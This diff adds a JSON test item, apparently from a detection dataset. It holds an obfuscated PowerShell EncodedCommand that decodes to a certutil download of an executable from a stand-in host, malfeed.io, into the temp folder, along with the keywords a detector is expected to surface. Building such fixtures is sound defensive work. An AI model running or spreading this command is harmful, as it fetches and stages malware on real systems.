@@ -1,0 +1,11 @@
+{
+  "id": "ps-encoded-2-mut3",
+  "category": "ps-encoded",
+  "command_line": "powershell.exe -NoProfile -EncodedCommand YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcAA6AC8ALwBtAGEAbABmAGUAZQBkAC4AaQBvAC8AbAAuAGUAeABlACAAJQB0AGUAbQBwACUAXABhAC4AZQB4AGUA\n# comment-3",
+  "expected_keywords": [
+    "certutil",
+    "malfeed.io"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
